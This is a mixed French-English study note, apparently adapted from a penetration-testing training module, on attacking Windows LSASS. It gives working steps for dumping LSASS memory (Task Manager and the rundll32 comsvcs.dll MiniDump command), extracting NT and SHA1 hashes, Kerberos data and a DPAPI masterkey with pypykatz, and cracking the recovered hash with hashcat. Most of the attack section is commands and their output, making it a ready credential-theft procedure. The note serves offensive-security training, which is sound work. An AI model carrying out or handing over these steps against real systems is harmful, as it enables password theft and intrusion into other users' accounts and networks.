# Attacking LSASS

***

***

En plus d’obtenir des copies de la base de données **SAM** afin d’extraire et de casser les **hashs de mots de passe**, nous allons également **tirer avantage du ciblage de LSASS**.

Comme expliqué dans la section **Stockage des identifiants** de ce module, **LSASS** (_Local Security Authority Subsystem Service_) est un **service critique** qui joue un rôle central dans la **gestion des identifiants** et les **processus d’authentification** sur tous les systèmes d’exploitation Windows.

![lsass Diagram](https://academy.hackthebox.com/storage/modules/147/lsassexe_diagram.png)

Upon initial logon, LSASS will:

* Cache credentials locally in memory
* Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Enforce security policies
* Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

We can use to <mark style="color:orange;">**dump LSASS memory**</mark> and extract credentials from a target running Windows.

***

## <mark style="color:red;">Dumping LSASS Process Memory</mark>

* Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via <mark style="color:orange;">**the generation of a memory dump**</mark>.&#x20;
* Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.

### <mark style="color:blue;">**Task Manager Method**</mark>

With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:

![Task Manager Memory Dump](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

A file called `lsass.DMP` is created and saved in:

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

This is the file we will transfer to our attack host.&#x20;

***

### <mark style="color:blue;">**Rundll32.exe & Comsvcs.dll Method**</mark>

We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32).&#x20;

Modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`.

#### <mark style="color:green;">**Finding LSASS PID in cmd**</mark>

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A

```

#### <mark style="color:green;">**Finding LSASS PID in PowerShell**</mark>

From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Once we have the PID assigned to the LSASS process, we can create the dump file.

#### <mark style="color:green;">**Creating lsass.dmp using PowerShell**</mark>

With an elevated PowerShell session, we can issue the following command to create the dump file:

{% code fullWidth="true" %}
```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 660 C:\lsass.dmp full
```
{% endcode %}

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).&#x20;

***

## <mark style="color:red;">Using Pypykatz to Extract Credentials</mark>

Pypykatz est une version de **Mimikatz** entièrement développée en **Python**. Son implémentation en Python permet de l’exécuter sur des machines d’attaque fonctionnant sous **Linux**.

Pour rappel, **LSASS** (_Local Security Authority Subsystem Service_) stocke les **identifiants des sessions utilisateur actives** sur les systèmes Windows. Lorsque nous effectuons un **vidage mémoire** du processus LSASS, nous capturons en réalité un **instantané** du contenu de la mémoire à cet instant précis. Si des sessions utilisateur sont actives, les identifiants ayant servi à les établir seront présents dans le fichier de vidage.

Lançons maintenant **Pypykatz** sur ce fichier de vidage pour extraire ces informations.

### <mark style="color:blue;">**Running Pypykatz**</mark>

Cette commande lance **Pypykatz** pour analyser les **secrets cachés** dans le vidage mémoire du processus **LSASS**.

Nous utilisons l'option **lsa** dans la commande, car **LSASS** est un sous-système de l'**Autorité de sécurité locale** (_Local Security Authority_). Ensuite, nous spécifions la source des données comme un **fichier minidump**, suivi du **chemin vers le fichier de vidage** (**/home/peter/Documents/lsass.dmp**) stocké sur notre machine d'attaque.

Pypykatz analyse le fichier de vidage et affiche les informations extraites.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
{% endcode %}

#### <mark style="color:green;">**MSV**</mark>

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.

#### <mark style="color:green;">**WDIGEST**</mark>

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update [here](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

#### <mark style="color:green;">**Kerberos**</mark>

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

#### <mark style="color:green;">**DPAPI**</mark>

<pre class="language-shell-session"><code class="lang-shell-session">	== DPAPI [14ab89]==
<strong>		luid 1354633
</strong>		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
</code></pre>

{% hint style="warning" %}
L'**API de protection des données** (**DPAPI** - _Data Protection Application Programming Interface_) est un ensemble d'API dans les systèmes d'exploitation Windows qui permet de chiffrer et de déchiffrer des blocs de données DPAPI de manière spécifique à chaque utilisateur. Elle est utilisée par les fonctionnalités de Windows ainsi que par diverses applications tierces.

Voici quelques exemples d'applications qui utilisent DPAPI et leurs usages :
{% endhint %}

<table data-full-width="true"><thead><tr><th>Applications</th><th>Use of DPAPI</th></tr></thead><tbody><tr><td><code>Internet Explorer</code></td><td>Password form auto-completion data (username and password for saved sites).</td></tr><tr><td><code>Google Chrome</code></td><td>Password form auto-completion data (username and password for saved sites).</td></tr><tr><td><code>Outlook</code></td><td>Passwords for email accounts.</td></tr><tr><td><code>Remote Desktop Connection</code></td><td>Saved credentials for connections to remote machines.</td></tr><tr><td><code>Credential Manager</code></td><td>Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.</td></tr></tbody></table>

Mimikatz et Pypykatz peuvent extraire la **clé maître DPAPI** (_masterkey_) de l'utilisateur actuellement connecté dont les données sont présentes dans la mémoire du processus **LSASS**.

#### <mark style="color:green;">**Explication du processus**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>

1. **Extraction de la masterkey** :
   * LSASS stocke temporairement cette clé, qui est utilisée par Windows pour protéger les données sensibles.
   * Un attaquant ayant accès à LSASS peut l'extraire avec Mimikatz ou Pypykatz.
2. **Utilisation de la masterkey pour déchiffrer les secrets** :
   * Une fois la clé récupérée, elle peut être utilisée pour déchiffrer les informations stockées par **DPAPI**.
   * Cela permet de récupérer des **identifiants de connexion** (_mots de passe, jetons d'authentification, clés privées, etc._) utilisés par différentes applications.

#### **Pourquoi c'est important ?**

* **DPAPI protège les données sensibles** des applications Windows (navigateur, gestionnaire de mots de passe, VPN, etc.).
* En récupérant la **masterkey**, un attaquant peut accéder à des **comptes et services critiques**.

***

#### <mark style="color:green;">**Cracking the NT Hash with Hashcat**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```
{% endcode %}
